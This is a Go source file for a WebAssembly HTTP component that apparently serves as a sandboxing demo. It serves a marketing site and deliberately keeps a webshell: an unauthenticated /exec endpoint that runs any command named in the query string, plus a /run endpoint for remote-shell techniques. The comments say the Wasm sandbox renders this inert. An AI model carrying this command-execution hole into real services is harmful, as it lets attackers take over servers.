// Package export_wasi_http_incoming_handler is the entrypoint componentize-go
// wires to `wasi:http/incoming-handler@0.2.0#handle`.
//
// This is the SAME PeopleFacts webshell as the container demo (see the sibling
// simpleexec-personfacts project): it serves the marketing site and exposes a
// /exec endpoint that runs arbitrary OS commands via os/exec. The point of this
// build is that the code is unchanged — but compiled to a WebAssembly component
// and run in the Cosmonic/wasmCloud sandbox, the process has NO ambient
// authority. There is no host syscall to fork/exec, so runCmd fails closed and
// the webshell is inert while the site keeps serving.
package export_wasi_http_incoming_handler

import (
	"embed"
	"fmt"
	"mime"
	"net/url"
	"os/exec"
	"path"
	"strings"

	. "wit_component/internal/wasi_http_types"

	streams "wit_component/internal/wasi_io_streams"

	. "go.bytecodealliance.org/pkg/wit/types"
)

//go:embed static/index.html static/css/*.css static/img/*.svg static/shell/index.html static/shell/hero.png static/favicon.svg static/site.js
var assets embed.FS

// Handle handles one incoming HTTP request.
func Handle(request *IncomingRequest, responseOut *ResponseOutparam) {
	pathWithQuery := request.PathWithQuery().SomeOr("/")

	reqPath := pathWithQuery
	rawQuery := ""
	if i := strings.IndexByte(pathWithQuery, '?'); i >= 0 {
		reqPath = pathWithQuery[:i]
		rawQuery = pathWithQuery[i+1:]
	}

	switch reqPath {
	case "/exec":
		q, _ := url.ParseQuery(rawQuery)
		cmd := q.Get("cmd")
		args := q["arg"]
		respond(responseOut, 200, "text/html; charset=utf-8", runCmd(cmd, args))
	case "/run":
		// The /shell demo: fire one remote-shell technique (or all of them)
		// through runCmd and report what the sandbox did with each step.
		respond(responseOut, 200, "application/json", handleRun(rawQuery))
	case "/shell", "/shell/":
		serveStatic(responseOut, "/shell/index.html")
	case "/health":
		respond(responseOut, 200, "text/plain; charset=utf-8", []byte("ok\n"))
	default:
		serveStatic(responseOut, reqPath)
	}
}

// runCmd is the original webshell primitive, byte-for-byte in spirit with the
// container version. In a container this returns command output (lateral
// movement). In the Wasm sandbox os/exec has no host to fork into, so Output()
// returns an ENOSYS-class error, which we surface verbatim.
func runCmd(cmd string, args []string) []byte {
	out, err := execCmd(cmd, args)
	if err != nil {
		return []byte(fmt.Sprintf("<html><pre>%v</pre></html>", err))
	}
	return []byte(fmt.Sprintf("<html><pre>%s</pre></html>", out))
}

// execCmd is the one line that makes this a webshell: run whatever the request
// names. /exec and /run both go through it.
func execCmd(cmd string, args []string) ([]byte, error) {
	return exec.Command(cmd, args...).Output()
}

func serveStatic(responseOut *ResponseOutparam, reqPath string) {
	clean := path.Clean("/" + strings.TrimPrefix(reqPath, "/"))
	if clean == "/" {
		clean = "/index.html"
	}

	data, err := assets.ReadFile("static" + clean)
	if err != nil {
		respond(responseOut, 404, "text/plain; charset=utf-8", []byte("404 not found"))
		return
	}

	ct := mime.TypeByExtension(path.Ext(clean))
	if ct == "" {
		ct = "application/octet-stream"
	}
	respond(responseOut, 200, ct, data)
}

// respond writes a complete HTTP response through the wasi:http outparam.
func respond(responseOut *ResponseOutparam, status uint16, contentType string, body []byte) {
	headers := MakeFields()
	headers.Set("content-type", [][]uint8{[]uint8(contentType)})

	response := MakeOutgoingResponse(headers)
	response.SetStatusCode(status)

	bodyRes := response.Body()
	ResponseOutparamSet(responseOut, Ok[*OutgoingResponse, ErrorCode](response))

	if bodyRes.IsErr() {
		return
	}
	body_ := bodyRes.Ok()

	if streamRes := body_.Write(); streamRes.IsOk() {
		stream := streamRes.Ok()
		writeAll(stream, body)
		stream.Drop()
	}

	OutgoingBodyFinish(body_, None[*Fields]())
}

// writeAll writes body in <=4096-byte chunks, honoring the stream's writable
// budget, so responses larger than one permit (the CSS/SVG assets) go out whole.
func writeAll(stream *streams.OutputStream, body []byte) {
	for len(body) > 0 {
		permit := uint64(4096)
		if cw := stream.CheckWrite(); cw.IsOk() {
			if n := cw.Ok(); n > 0 && n < permit {
				permit = n
			}
		}
		chunk := body
		if uint64(len(chunk)) > permit {
			chunk = body[:permit]
		}
		if res := stream.BlockingWriteAndFlush(chunk); res.IsErr() {
			return
		}
		body = body[len(chunk):]
	}
}
